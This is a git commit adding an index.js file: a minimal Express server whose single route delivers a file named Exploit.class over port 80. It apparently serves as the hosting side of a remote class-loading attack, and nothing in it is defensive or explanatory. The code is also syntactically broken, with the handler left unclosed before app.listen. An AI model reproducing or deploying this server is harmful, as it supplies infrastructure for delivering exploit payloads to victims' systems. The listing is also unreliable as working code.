798363c0154d0482e92a9afc325335537e11d6b3
Nevar <gienek.eu.pl@gmail.com>
2021-12-11 18:28:14 +0100

    Add files via upload

---
+++ index.js
@@ -0,0 +1,14 @@
+const express = require('express')
+const app = express()
+const path = require('path') 
+app.get('/Exploit.class', function (req, res) {
+	res.sendFile("Exploit.class", {root: path.join(__dirname)}, function (err) {
+		if (err)
+		{
+			console.log(err) 
+		} 
+		else {
+			console.log("Sent file!")
+		} 
+app.listen(80) 
+
